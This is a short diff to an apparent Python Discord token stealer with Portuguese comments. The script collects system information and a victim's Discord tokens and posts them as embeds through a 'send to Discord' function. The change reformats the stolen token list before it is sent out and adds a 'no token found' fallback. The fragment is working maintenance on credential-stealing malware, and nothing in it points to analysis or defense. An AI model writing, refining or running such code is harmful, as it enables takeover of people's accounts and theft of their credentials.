@@ -51,14 +51,17 @@ if __name__ == "__main__":
     sistema_embed = {
         'title': 'Informações do Sistema',
         'description': f'```\n{informacoes_sistema}\n```',
-        'color': 0x00FF00  # Verde
+        'color': 0x00FF00  
     }
     enviar_para_discord('', embed=sistema_embed)
 
+    # Ajusta a formatação dos tokens
+    formatted_discord_info = '\n'.join(discord_info) if discord_info else 'Nenhum token encontrado'
+
     discord_embed = {
         'title': 'Informações do Discord',
-        'description': f'```\n{discord_info}\n```',
-        'color': 0xFF0000  # Vermelho
+        'description': f'```\n{formatted_discord_info}\n```',
+        'color': 0xFF0000  
     }
     enviar_para_discord('', embed=discord_embed)
 
